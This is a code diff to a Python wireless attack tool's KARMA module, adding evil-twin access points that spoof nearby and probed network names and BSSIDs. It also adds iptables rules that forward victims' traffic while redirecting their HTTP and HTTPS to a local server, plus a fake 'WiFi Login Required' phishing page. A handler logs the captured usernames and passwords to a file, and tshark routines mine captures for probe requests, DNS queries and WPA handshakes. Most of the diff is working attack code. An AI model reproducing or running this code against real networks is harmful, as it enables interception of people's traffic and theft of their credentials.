+    def detect_new_clients(self, capfile):
+        """Detect new clients from captured traffic"""
+        try:
+            new_clients = []
+            
+            # Look for probe requests (new clients scanning)
+            probe_cmd = [
+                'tshark',
+                '-r', capfile,
+                '-Y', 'wlan.fc.type_subtype == 0x04',  # Probe request
+                '-T', 'fields',
+                '-e', 'wlan.sa'  # Source MAC
+            ]
+            
+            result = subprocess.run(probe_cmd, capture_output=True, text=True, timeout=10)
+            if result.returncode == 0:
+                for line in result.stdout.split('\n'):
+                    if line.strip():
+                        client_mac = line.strip()
+                        if client_mac not in self.connected_clients and client_mac not in self.client_probes:
+                            new_clients.append(client_mac)
+            
+            return new_clients[:5]  # Return max 5 new clients
+            
+        except Exception:
             return []
     
     
@@ -3031,6 +3527,15 @@ class AttackKARMA(Attack):
                 if hasattr(self, 'target') and self.target:
                     Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'DNS spoofing disabled - Layer 2 only')
             
+            # Setup internet access if enabled
+            if getattr(Configuration, 'karma_internet_access', False):
+                if hasattr(self, 'target') and self.target:
+                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Setting up internet access')
+                if not self.setup_internet_access():
+                    Color.pl('{!} {R}Failed to setup internet access - continuing without{W}')
+            else:
+                Color.pl('{+} {O}Internet access disabled - victims will have no internet connectivity{W}')
+            
             # Reset rogue interface for AP mode (only if single interface mode)
             if self.single_interface_mode:
                 if hasattr(self, 'target') and self.target:
@@ -3105,8 +3610,11 @@ class AttackKARMA(Attack):
             # Create multiple hostapd configs for different networks
             self.hostapd_configs = []
             
+            # Get encryption type from configuration
+            encryption_type = getattr(Configuration, 'karma_encryption', 'mixed')
+            
             # Create config for the primary target network
-            primary_config = self.create_single_hostapd_config(target_ssid, target_channel, target_bssid)
+            primary_config = self.create_single_hostapd_config(target_ssid, target_channel, target_bssid, encryption_type)
             if primary_config:
                 self.hostapd_configs.append(primary_config)
                 Color.pl('{+} {G}Created Evil Twin for: {C}%s{W} (Channel {C}%s{W})' % (target_ssid, target_channel))
@@ -3114,7 +3622,7 @@ class AttackKARMA(Attack):
             # Create additional configs for other popular networks
             for ssid in list(self.pnl_networks)[:3]:  # Limit to 3 additional networks
                 if ssid != target_ssid and ssid != '<MISSING>' and ssid.strip():
-                    additional_config = self.create_single_hostapd_config(ssid, target_channel, None)
+                    additional_config = self.create_single_hostapd_config(ssid, target_channel, None, encryption_type)
                     if additional_config:
                         self.hostapd_configs.append(additional_config)
                         Color.pl('{+} {G}Created additional Evil Twin: {C}%s{W}' % ssid)
@@ -3148,11 +3656,14 @@ class AttackKARMA(Attack):
             self.hostapd_configs = []
             created_count = 0
             
+            # Get encryption type from configuration
+            encryption_type = getattr(Configuration, 'karma_encryption', 'mixed')
+            
             # Step 1: Create Evil Twins for PNL SSIDs (from probe requests)
             Color.pl('{+} {C}Step 1: Creating Evil Twins from probe requests (PNL)...{W}')
             for ssid in list(self.pnl_networks):
                 if ssid and ssid != '<MISSING>' and ssid.strip() and len(ssid) <= 32:
-                    config = self.create_single_hostapd_config(ssid, target_channel, None)
+                    config = self.create_single_hostapd_config(ssid, target_channel, None, encryption_type)
                     if config:
                         self.hostapd_configs.append(config)
                         created_count += 1
@@ -3170,7 +3681,7 @@ class AttackKARMA(Attack):
                         # Use the network's actual channel for better compatibility
                         network_channel = int(network.channel) if network.channel else target_channel
                         
-                        config = self.create_single_hostapd_config(network.essid, network_channel, network.bssid)
+                        config = self.create_single_hostapd_config(network.essid, network_channel, network.bssid, encryption_type)
                         if config:
                             self.hostapd_configs.append(config)
                             created_count += 1
@@ -3236,9 +3747,12 @@ class AttackKARMA(Attack):
             
             Color.pl('{+} {G}Creating Evil Twin for target network: {C}%s{W} (Channel {C}%s{W})' % (target_ssid, target_channel))
             
+            # Get encryption type from configuration
+            encryption_type = getattr(Configuration, 'karma_encryption', 'mixed')
+            
             # Create config for the target network
             self.hostapd_configs = []
-            config = self.create_single_hostapd_config(target_ssid, target_channel, target_bssid)
+            config = self.create_single_hostapd_config(target_ssid, target_channel, target_bssid, encryption_type)
             if config:
                 self.hostapd_configs.append(config)
                 Color.pl('{+} {G}Created Evil Twin for: {C}%s{W}' % target_ssid)
@@ -3458,13 +3972,21 @@ class AttackKARMA(Attack):
             return False
     
     
-    def create_single_hostapd_config(self, ssid, channel, spoof_bssid=None):
-        """Create a single hostapd configuration file"""
+    def create_single_hostapd_config(self, ssid, channel, spoof_bssid=None, encryption_type='wpa2'):
+        """Create a single hostapd configuration file with WPA/WPA2/WPA3 for credential capture
+        
+        Args:
+            ssid: SSID name
+            channel: WiFi channel
+            spoof_bssid: Optional BSSID to spoof
+            encryption_type: 'wpa', 'wpa2', 'wpa3', 'none' (default: 'wpa2')
+        """
         try:
             # Ensure SSID is not too long
             if len(ssid) > 32:
                 ssid = ssid[:32]
             
+            # Build base configuration
             config_content = f"""interface={self.rogue_interface}
 driver=nl80211
 ssid={ssid}
@@ -3476,11 +3998,63 @@ auth_algs=1
 ignore_broadcast_ssid=0
 """
             
+            # Add encryption based on type
+            if encryption_type.lower() == 'wpa':
+                # WPA (TKIP) - legacy support
+                config_content += """# Enable WPA (TKIP) for credential capture
+wpa=1
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP
+wpa_passphrase=karma12345678
+"""
+                Color.pl('{+} {G}Configured WPA (TKIP) encryption for {C}%s{W}' % ssid)
+                
+            elif encryption_type.lower() == 'wpa2':
+                # WPA2 (CCMP) - most common
+                config_content += """# Enable WPA2 (CCMP) for credential capture
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP CCMP
+rsn_pairwise=CCMP
+wpa_passphrase=karma12345678
+"""
+                Color.pl('{+} {G}Configured WPA2 (CCMP) encryption for {C}%s{W}' % ssid)
+                
+            elif encryption_type.lower() == 'wpa3':
+                # WPA3 (SAE) - modern encryption
+                config_content += """# Enable WPA3 (SAE) for credential capture
+wpa=3
+wpa_key_mgmt=SAE
+wpa_pairwise=CCMP
+rsn_pairwise=CCMP
+wpa_passphrase=karma12345678
+sae_password=karma12345678
+ieee80211w=2
+"""
+                Color.pl('{+} {G}Configured WPA3 (SAE) encryption for {C}%s{W}' % ssid)
+                
+            elif encryption_type.lower() == 'mixed':
+                # WPA2/WPA3 mixed mode - maximum compatibility
+                config_content += """# Enable WPA2/WPA3 mixed mode for maximum compatibility
+wpa=3
+wpa_key_mgmt=WPA-PSK SAE
+wpa_pairwise=TKIP CCMP
+rsn_pairwise=CCMP
+wpa_passphrase=karma12345678
+sae_password=karma12345678
+ieee80211w=2
+"""
+                Color.pl('{+} {G}Configured WPA2/WPA3 mixed mode encryption for {C}%s{W}' % ssid)
+                
+            else:
+                # No encryption - open network (for initial testing)
+                Color.pl('{+} {O}No encryption configured for {C}%s{W} (open network){W}' % ssid)
+            
             # Add BSSID spoofing if specified
             if spoof_bssid:
                 config_content += f"bssid={spoof_bssid}\n"
             
-            config_file = Configuration.temp('hostapd_karma_%s.conf' % ssid.replace(' ', '_'))
+            config_file = Configuration.temp('hostapd_karma_%s_%s.conf' % (ssid.replace(' ', '_'), encryption_type))
             with open(config_file, 'w') as f:
                 f.write(config_content)
             
@@ -3614,6 +4188,586 @@ server=8.8.8.8
             if hasattr(self, 'target') and self.target:
                 Color.pattack('KARMA', self.target, 'DNS Redirection', 'Failed - ' + error_msg)
             return False
+    
+    def setup_internet_access(self):
+        """Setup internet access for victims by bridging traffic to real internet"""
+        try:
+            Color.pl('{+} {C}Setting up internet access for victims...{W}')
+            
+            # Detect internet interface (usually eth0, enp0s3, etc.)
+            internet_interface = self.detect_internet_interface()
+            if not internet_interface:
+                Color.pl('{!} {R}Could not detect internet interface - internet access disabled{W}')
+                return False
+            
+            Color.pl('{+} {G}Detected internet interface: {C}%s{W}' % internet_interface)
+            
+            # Setup internet bridging commands
+            commands = [
+                # Enable IP forwarding
+                'echo "1" > /proc/sys/net/ipv4/ip_forward',
+                
+                # Forward traffic from AP to internet
+                f'iptables -A FORWARD -i {self.rogue_interface} -o {internet_interface} -j ACCEPT',
+                
+                # Allow established connections back
+                f'iptables -A FORWARD -i {internet_interface} -o {self.rogue_interface} -m state --state ESTABLISHED,RELATED -j ACCEPT',
+                
+                # NAT for internet access
+                f'iptables -t nat -A POSTROUTING -o {internet_interface} -j MASQUERADE',
+                
+                # Keep existing DNS spoofing rules for credential harvesting
+                f'iptables -t nat -A PREROUTING -i {self.rogue_interface} -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80',
+                f'iptables -t nat -A PREROUTING -i {self.rogue_interface} -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:80'
+            ]
+            
+            failed_commands = []
+            for cmd in commands:
+                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+                if result.returncode != 0:
+                    Color.pl('{!} {R}Warning: Command failed: {O}%s{W}' % cmd)
+                    if result.stderr:
+                        Color.pl('{!} {O}Error: {R}%s{W}' % result.stderr.strip())
+                    failed_commands.append(cmd)
+            
+            if failed_commands:
+                error_msg = f'Internet access setup partially failed - {len(failed_commands)} commands failed'
+                Color.pl('{!} {R}%s{W}' % error_msg)
+                
+                # Also log to GUI
+                if hasattr(self, 'target') and self.target:
+                    Color.pattack('KARMA', self.target, 'Internet Access', 'Warning - ' + error_msg)
+            else:
+                Color.pl('{+} {G}Internet access setup complete - victims can now access internet{W}')
+                Color.pl('{+} {C}HTTP/HTTPS traffic will be captured for credential harvesting{W}')
+            
+            # Store internet interface for cleanup
+            self.internet_interface = internet_interface
+            
+            return True
+            
+        except Exception as e:
+            error_msg = 'Failed to setup internet access: ' + str(e)
+            Color.pl('{!} {R}%s{W}' % error_msg)
+            
+            # Also log to GUI
+            if hasattr(self, 'target') and self.target:
+                Color.pattack('KARMA', self.target, 'Internet Access', 'Failed - ' + error_msg)
+            return False
+    
+    def detect_internet_interface(self):
+        """Detect the interface connected to the internet"""
+        try:
+            # Get default route interface
+            result = subprocess.run(['ip', 'route', 'show', 'default'], capture_output=True, text=True)
+            if result.returncode == 0:
+                for line in result.stdout.split('\n'):
+                    if 'default via' in line:
+                        # Extract interface from route (e.g., "default via 192.168.1.1 dev eth0")
+                        parts = line.split()
+                        for i, part in enumerate(parts):
+                            if part == 'dev' and i + 1 < len(parts):
+                                interface = parts[i + 1]
+                                # Verify interface exists and is up
+                                if self.verify_interface_up(interface):
+                                    return interface
+            
+            # Fallback: try common interface names
+            common_interfaces = ['eth0', 'enp0s3', 'ens33', 'wlan1', 'wlp2s0']
+            for interface in common_interfaces:
+                if self.verify_interface_up(interface):
+                    return interface
+            
+            return None
+            
+        except Exception as e:
+            Color.pl('{!} {R}Error detecting internet interface: {O}%s{W}' % str(e))
+            return None
+    
+    def verify_interface_up(self, interface):
+        """Verify that an interface exists and is up"""
+        try:
+            result = subprocess.run(['ip', 'link', 'show', interface], capture_output=True, text=True)
+            if result.returncode == 0 and 'state UP' in result.stdout:
+                return True
+            return False
+        except Exception:
+            return False
+    
+    def start_credential_harvesting_server(self):
+        """Start web server for credential harvesting"""
+        try:
+            Color.pl('{+} {C}Starting credential harvesting web server...{W}')
+            
+            # Create web server directory
+            web_dir = os.path.join(Configuration.karma_captures_dir, 'web_server')
+            os.makedirs(web_dir, exist_ok=True)
+            
+            # Create fake login pages
+            self.create_fake_login_pages(web_dir)
+            
+            # Start web server
+            self.web_server_process = subprocess.Popen([
+                'python3', '-m', 'http.server', '80', '--directory', web_dir
+            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            
+            # Give it time to start
+            time.sleep(2)
+            
+            # Check if server started successfully
+            if self.web_server_process.poll() is None:
+                Color.pl('{+} {G}Credential harvesting web server started on port 80{W}')
+                Color.pl('{+} {C}Victims will see fake login pages when accessing websites{W}')
+                Color.pl('{+} {C}Credentials will be logged to: {G}%s{W}' % os.path.join(web_dir, 'credentials.log'))
+                return True
+            else:
+                Color.pl('{!} {R}Failed to start web server - continuing without credential harvesting{W}')
+                return False
+                
+        except Exception as e:
+            Color.pl('{!} {R}Error starting credential harvesting server: {O}%s{W}' % str(e))
+            return False
+    
+    def create_fake_login_pages(self, web_dir):
+        """Create fake login pages for credential harvesting"""
+        try:
+            # Create main index page
+            index_html = """<!DOCTYPE html>
+<html>
+<head>
+    <title>WiFi Login Required</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }
+        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h1 { color: #333; text-align: center; margin-bottom: 30px; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 5px; color: #555; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        button:hover { background: #0056b3; }
+        .error { color: red; text-align: center; margin-top: 10px; }
+        .success { color: green; text-align: center; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>WiFi Login Required</h1>
+        <p style="text-align: center; color: #666; margin-bottom: 30px;">Please enter your WiFi credentials to continue</p>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">Username:</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <button type="submit">Connect to WiFi</button>
+        </form>
+        <div id="message"></div>
+    </div>
+    
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            
+            // Send credentials to server
+            fetch('/login', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: 'username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password)
+            })
+            .then(response => response.text())
+            .then(data => {
+                document.getElementById('message').innerHTML = '<div class="success">Connecting to WiFi... Please wait.</div>';
+                // Redirect to a fake success page after 3 seconds
+                setTimeout(function() {
+                    window.location.href = '/success';
+                }, 3000);
+            })
+            .catch(error => {
+                document.getElementById('message').innerHTML = '<div class="error">Connection failed. Please try again.</div>';
+            });
+        });
+    </script>
+</body>
+</html>"""
+            
+            with open(os.path.join(web_dir, 'index.html'), 'w') as f:
+                f.write(index_html)
+            
+            # Create login handler script
+            login_handler = """#!/usr/bin/env python3
+import os
+import time
+from urllib.parse import parse_qs
+
+def handle_login(environ, start_response):
+    if environ['REQUEST_METHOD'] == 'POST':
+        # Get POST data
+        try:
+            request_body_size = int(environ.get('CONTENT_LENGTH', 0))
+        except ValueError:
+            request_body_size = 0
+        
+        request_body = environ['wsgi.input'].read(request_body_size)
+        post_data = parse_qs(request_body.decode('utf-8'))
+        
+        username = post_data.get('username', [''])[0]
+        password = post_data.get('password', [''])[0]
+        
+        # Log credentials
+        log_file = os.path.join(os.path.dirname(__file__), 'credentials.log')
+        with open(log_file, 'a') as f:
+            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - Username: {username}, Password: {password}\\n")
+        
+        # Return success response
+        start_response('200 OK', [('Content-Type', 'text/plain')])
+        return [b'Login successful']
+    
+    # Return 404 for other requests
+    start_response('404 Not Found', [('Content-Type', 'text/plain')])
+    return [b'Not Found']
+
+def application(environ, start_response):
+    if environ['PATH_INFO'] == '/login':
+        return handle_login(environ, start_response)
+    else:
+        start_response('404 Not Found', [('Content-Type', 'text/plain')])
+        return [b'Not Found']
+"""
+            
+            with open(os.path.join(web_dir, 'login_handler.py'), 'w') as f:
+                f.write(login_handler)
+            
+            # Create success page
+            success_html = """<!DOCTYPE html>
+<html>
+<head>
+    <title>Connected Successfully</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }
+        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
+        h1 { color: #28a745; }
+        p { color: #666; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>✓ Connected Successfully!</h1>
+        <div class="spinner"></div>
+        <p>You are now connected to the WiFi network.</p>
+        <p>You can now browse the internet normally.</p>
+    </div>
+</body>
+</html>"""
+            
+            with open(os.path.join(web_dir, 'success.html'), 'w') as f:
+                f.write(success_html)
+            
+            Color.pl('{+} {G}Created fake login pages for credential harvesting{W}')
+            
+        except Exception as e:
+            Color.pl('{!} {R}Error creating fake login pages: {O}%s{W}' % str(e))
+    
+    def analyze_captured_traffic(self, capfile):
+        """Comprehensive analysis of captured traffic for KARMA attack"""
+        try:
+            Color.pl('\n{+} {C}Analyzing captured traffic: {G}%s{W}' % capfile)
+            Color.pl('=' * 60)
+            
+            if not os.path.exists(capfile):
+                Color.pl('{!} {R}Capture file not found: {O}%s{W}' % capfile)
+                return False
+            
+            # 1. Basic file information
+            self._analyze_file_info(capfile)
+            
+            # 2. Protocol analysis
+            self._analyze_protocols(capfile)
+            
+            # 3. HTTP traffic analysis
+            self._analyze_http_traffic(capfile)
+            
+            # 4. DNS queries analysis
+            self._analyze_dns_queries(capfile)
+            
+            # 5. Probe requests analysis
+            self._analyze_probe_requests(capfile)
+            
+            # 6. Authentication analysis
+            self._analyze_authentication(capfile)
+            
+            # 7. EAPOL analysis (WPA handshakes)
+            self._analyze_eapol_packets(capfile)
+            
+            # 8. Client activity analysis
+            self._analyze_client_activity(capfile)
+            
+            Color.pl('\n{+} {G}Traffic analysis complete{W}')
+            return True
+            
+        except Exception as e:
+            Color.pl('{!} {R}Error analyzing traffic: {O}%s{W}' % str(e))
+            return False
+    
+    def _analyze_file_info(self, capfile):
+        """Analyze basic file information"""
+        try:
+            Color.pl('\n📊 File Information:')
+            
+            # Get file size
+            file_size = os.path.getsize(capfile)
+            Color.pl('  File size: {C}%s{W}' % self._format_bytes(file_size))
+            
+            # Get packet count
+            result = subprocess.run(['tshark', '-r', capfile, '-T', 'fields', '-e', 'frame.number'], 
+                                  capture_output=True, text=True, timeout=30)
+            if result.returncode == 0:
+                packet_count = len([line for line in result.stdout.split('\n') if line.strip()])
+                Color.pl('  Total packets: {C}%d{W}' % packet_count)
+            else:
+                Color.pl('  Could not determine packet count')
+                
+        except Exception as e:
+            Color.pl('  Error analyzing file info: {O}%s{W}' % str(e))
+    
+    def _analyze_protocols(self, capfile):
+        """Analyze protocols present in the capture"""
+        try:
+            Color.pl('\n🌐 Protocol Analysis:')
+            
+            protocols = ['http', 'dns', 'tcp', 'udp', 'eapol', 'wlan', 'arp', 'icmp']
+            protocol_counts = {}
+            
+            for protocol in protocols:
+                try:
+                    result = subprocess.run(['tshark', '-r', capfile, '-Y', protocol, '-T', 'fields', '-e', 'frame.number'], 
+                                          capture_output=True, text=True, timeout=15)
+                    if result.returncode == 0:
+                        count = len([line for line in result.stdout.split('\n') if line.strip()])
+                        if count > 0:
+                            protocol_counts[protocol] = count
+                except:
+                    pass
+            
+            if protocol_counts:
+                for protocol, count in sorted(protocol_counts.items()):
+                    Color.pl('  {G}%s{W}: {C}%d{W} packets' % (protocol.upper(), count))
+            else:
+                Color.pl('  No protocol data found')
+                
+        except Exception as e:
+            Color.pl('  Error analyzing protocols: {O}%s{W}' % str(e))
+    
+    def _analyze_http_traffic(self, capfile):
+        """Analyze HTTP traffic"""
+        try:
+            Color.pl('\n🌍 HTTP Traffic Analysis:')
+            
+            # HTTP requests
+            result = subprocess.run([
+                'tshark', '-r', capfile, '-Y', 'http.request.method',
+                '-T', 'fields', '-e', 'http.host', '-e', 'http.request.uri', '-e', 'http.user_agent'
+            ], capture_output=True, text=True, timeout=15)
+            
+            if result.returncode == 0 and result.stdout.strip():
+                Color.pl('  HTTP requests found:')
+                requests = []
+                for line in result.stdout.strip().split('\n'):
+                    parts = line.split('\t')
+                    if len(parts) >= 2:
+                        host = parts[0] if parts[0] else "Unknown"
+                        uri = parts[1] if len(parts) > 1 and parts[1] else "/"
+                        requests.append(f"{host}{uri}")
+                
+                # Show unique requests
+                unique_requests = list(set(requests))
+                for req in unique_requests[:10]:  # Show first 10
+                    Color.pl('    {C}%s{W}' % req)
+                
+                if len(unique_requests) > 10:
+                    Color.pl('    ... and {C}%d{W} more requests' % (len(unique_requests) - 10))
+            else:
+                Color.pl('  ❌ No HTTP traffic found')
+                
+        except Exception as e:
+            Color.pl('  ❌ Error analyzing HTTP: {O}%s{W}' % str(e))
+    
+    def _analyze_dns_queries(self, capfile):
+        """Analyze DNS queries"""
+        try:
+            Color.pl('\n🔍 DNS Queries Analysis:')
+            
+            result = subprocess.run([
+                'tshark', '-r', capfile, '-Y', 'dns.flags.response == 0',
+                '-T', 'fields', '-e', 'dns.qry.name'
+            ], capture_output=True, text=True, timeout=15)
+            
+            if result.returncode == 0 and result.stdout.strip():
+                domains = set()
+                for line in result.stdout.strip().split('\n'):
+                    if line.strip():
+                        domains.add(line.strip())
+                
+                Color.pl('  DNS queries found ({C}%d{W} unique domains):' % len(domains))
+                for domain in sorted(list(domains)[:15]):  # Show first 15
+                    Color.pl('    {C}%s{W}' % domain)
+                
+                if len(domains) > 15:
+                    Color.pl('    ... and {C}%d{W} more domains' % (len(domains) - 15))
+            else:
+                Color.pl('  ❌ No DNS queries found')
+                
+        except Exception as e:
+            Color.pl('  ❌ Error analyzing DNS: {O}%s{W}' % str(e))
+    
+    def _analyze_probe_requests(self, capfile):
+        """Analyze probe requests"""
+        try:
+            Color.pl('\n📡 Probe Requests Analysis:')
+            
+            result = subprocess.run([
+                'tshark', '-r', capfile, '-Y', 'wlan.fc.type_subtype == 0x04',
+                '-T', 'fields', '-e', 'wlan.sa', '-e', 'wlan.ssid'
+            ], capture_output=True, text=True, timeout=15)
+            
+            if result.returncode == 0 and result.stdout.strip():
+                probes = {}
+                for line in result.stdout.strip().split('\n'):
+                    if '\t' in line:
+                        parts = line.split('\t')
+                        if len(parts) >= 2:
+                            mac = parts[0].strip()
+                            ssid = parts[1].strip()
+                            if mac and ssid:
+                                if mac not in probes:
+                                    probes[mac] = set()
+                                probes[mac].add(ssid)
+                
+                Color.pl('  Probe requests from {C}%d{W} devices:' % len(probes))
+                for mac, ssids in list(probes.items())[:10]:  # Show first 10
+                    Color.pl('    {G}%s{W}: {C}%s{W}' % (mac, ', '.join(sorted(ssids))))
+                
+                if len(probes) > 10:
+                    Color.pl('    ... and {C}%d{W} more devices' % (len(probes) - 10))
+            else:
+                Color.pl('  ❌ No probe requests found')
+                
+        except Exception as e:
+            Color.pl('  ❌ Error analyzing probe requests: {O}%s{W}' % str(e))
+    
+    def _analyze_authentication(self, capfile):
+        """Analyze authentication attempts"""
+        try:
+            Color.pl('\n🔐 Authentication Analysis:')
+            
+            result = subprocess.run([
+                'tshark', '-r', capfile, '-Y', 'wlan.fc.type_subtype == 0x0b',
+                '-T', 'fields', '-e', 'wlan.sa', '-e', 'wlan.da'
+            ], capture_output=True, text=True, timeout=15)
+            
+            if result.returncode == 0 and result.stdout.strip():
+                auths = set()
+                for line in result.stdout.strip().split('\n'):
+                    if '\t' in line:
+                        parts = line.split('\t')
+                        if len(parts) >= 2:
+                            auths.add(f"{parts[0]} -> {parts[1]}")
+                
+                Color.pl('  Authentication attempts ({C}%d{W}):' % len(auths))
+                for auth in sorted(list(auths)[:10]):  # Show first 10
+                    Color.pl('    {C}%s{W}' % auth)
+                
+                if len(auths) > 10:
+                    Color.pl('    ... and {C}%d{W} more attempts' % (len(auths) - 10))
+            else:
+                Color.pl('  ❌ No authentication attempts found')
+                
+        except Exception as e:
+            Color.pl('  ❌ Error analyzing authentication: {O}%s{W}' % str(e))
+    
+    def _analyze_eapol_packets(self, capfile):
+        """Analyze EAPOL packets (WPA handshakes)"""
+        try:
+            Color.pl('\n🔑 EAPOL Analysis (WPA Handshakes):')
+            
+            result = subprocess.run([
+                'tshark', '-r', capfile, '-Y', 'eapol',
+                '-T', 'fields', '-e', 'wlan.sa', '-e', 'wlan.da', '-e', 'eapol.type'
+            ], capture_output=True, text=True, timeout=15)
+            
+            if result.returncode == 0 and result.stdout.strip():
+                eapol_packets = {}
+                for line in result.stdout.strip().split('\n'):
+                    if '\t' in line:
+                        parts = line.split('\t')
+                        if len(parts) >= 3:
+                            sa = parts[0].strip()
+                            da = parts[1].strip()
+                            eapol_type = parts[2].strip()
+                            key = f"{sa} <-> {da}"
+                            if key not in eapol_packets:
+                                eapol_packets[key] = []
+                            eapol_packets[key].append(eapol_type)
+                
+                Color.pl('  EAPOL packets found:')
+                for key, types in list(eapol_packets.items())[:10]:  # Show first 10
+                    Color.pl('    {G}%s{W}: {C}%s{W}' % (key, ', '.join(types)))
+                
+                if len(eapol_packets) > 10:
+                    Color.pl('    ... and {C}%d{W} more pairs' % (len(eapol_packets) - 10))
+            else:
+                Color.pl('  ❌ No EAPOL packets found')
+                
+        except Exception as e:
+            Color.pl('  ❌ Error analyzing EAPOL: {O}%s{W}' % str(e))
+    
+    def _analyze_client_activity(self, capfile):
+        """Analyze client activity patterns"""
+        try:
+            Color.pl('\n👥 Client Activity Analysis:')
+            
+            # Get unique MAC addresses
+            result = subprocess.run([
+                'tshark', '-r', capfile, '-T', 'fields', '-e', 'wlan.sa'
+            ], capture_output=True, text=True, timeout=15)
+            
+            if result.returncode == 0 and result.stdout.strip():
+                macs = set()
+                for line in result.stdout.strip().split('\n'):
+                    if line.strip() and ':' in line:
+                        macs.add(line.strip())
+                
+                Color.pl('  Unique MAC addresses: {C}%d{W}' % len(macs))
+                
+                # Show first few MACs
+                for mac in sorted(list(macs)[:5]):
+                    Color.pl('    {G}%s{W}' % mac)
+                
+                if len(macs) > 5:
+                    Color.pl('    ... and {C}%d{W} more devices' % (len(macs) - 5))
+            else:
+                Color.pl('  ❌ No client activity found')
+                
+        except Exception as e:
+            Color.pl('  ❌ Error analyzing client activity: {O}%s{W}' % str(e))
+    
+    def _format_bytes(self, bytes_size):
+        """Format bytes into human readable format"""
+        for unit in ['B', 'KB', 'MB', 'GB']:
+            if bytes_size < 1024.0:
+                return f"{bytes_size:.1f} {unit}"
+            bytes_size /= 1024.0
+        return f"{bytes_size:.1f} TB"
     
     def free_port_53(self):
         """Preflight: stop services that may hold port 53 and ensure AP iface is up."""
@@ -3868,31 +5022,43 @@ server=8.8.8.8
                         
                         # Start credential harvesting for this client
                         self.harvest_credentials_from_client(mac)
+                        
+                        # Start general traffic capture for this client
+                        self.capture_client_traffic(mac)
                 
                 # Show periodic status updates
                 if current_time - last_status_time >= status_interval:
                     self.show_connection_status()
+                    # Clean up stale interface locks periodically
+                    self.cleanup_stale_interface_locks()
                     last_status_time = current_time
                 
-                # Adaptive sleep based on activity
+                # Enhanced: Check for disconnected clients
+                disconnected = self.connected_clients - connected_macs
+                if disconnected:
+                    for mac in disconnected:
+                        Color.pl('{!} {O}Client disconnected: {C}%s{W}' % mac)
+                        self.connected_clients.discard(mac)
+                
+                # Adaptive sleep based on activity - more frequent for better monitoring
                 if len(self.connected_clients) > 0:
-                    time.sleep(3)  # More frequent checks when clients are connected
+                    time.sleep(2)  # More frequent checks when clients are connected
                 else:
-                    time.sleep(8)  # Less frequent checks when no clients
+                    time.sleep(5)  # Less frequent checks when no clients
                 
         except Exception as e:
             if Configuration.verbose > 1:
                 Color.pl('{!} {R}Error monitoring connections: {O}%s{W}' % str(e))
     
     def detect_rogue_ap_connections(self):
-        """Detect client connections to our rogue AP using multiple methods"""
+        """Detect client connections to our rogue AP using multiple methods - Enhanced implementation"""
         try:
             connected_macs = set()
             
-            # Method 1: Check hostapd station dump
+            # Method 1: Check hostapd station dump (improved)
             try:
                 cmd = ['iw', 'dev', str(self.rogue_interface), 'station', 'dump']
-                result = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                 
                 if result.returncode == 0:
                     for line in result.stdout.split('\n'):
@@ -3900,11 +5066,24 @@ server=8.8.8.8
                             mac_match = re.search(r'([a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2})', line)
                             if mac_match:
                                 connected_macs.add(mac_match.group(1).lower())
-            except (subprocess.TimeoutExpired, subprocess.CalledProcessError, OSError) as e:
+            except Exception as e:
                 if Configuration.verbose > 1:
-                    Color.pl('{!} {R}Error checking station dump: {O}%s{W}' % str(e))
+                    Color.pl('{!} {R}iw command failed: {O}%s{W}' % str(e))
             
-            # Method 2: Check DHCP leases if dnsmasq is running
+            # Method 2: Check hostapd directly (if available)
+            try:
+                hostapd_ctrl = f'/var/run/hostapd/{self.rogue_interface}'
+                if os.path.exists(hostapd_ctrl):
+                    cmd = ['hostapd_cli', '-i', self.rogue_interface, 'list_sta']
+                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
+                    if result.returncode == 0:
+                        for line in result.stdout.split('\n'):
+                            if line.strip() and ':' in line:
+                                connected_macs.add(line.strip().lower())
+            except Exception:
+                pass
+            
+            # Method 3: Enhanced DHCP lease checking
             if hasattr(self, 'dnsmasq_config') and self.dnsmasq_config:
                 try:
                     leases_file = self.dnsmasq_config.replace('.conf', '.leases')
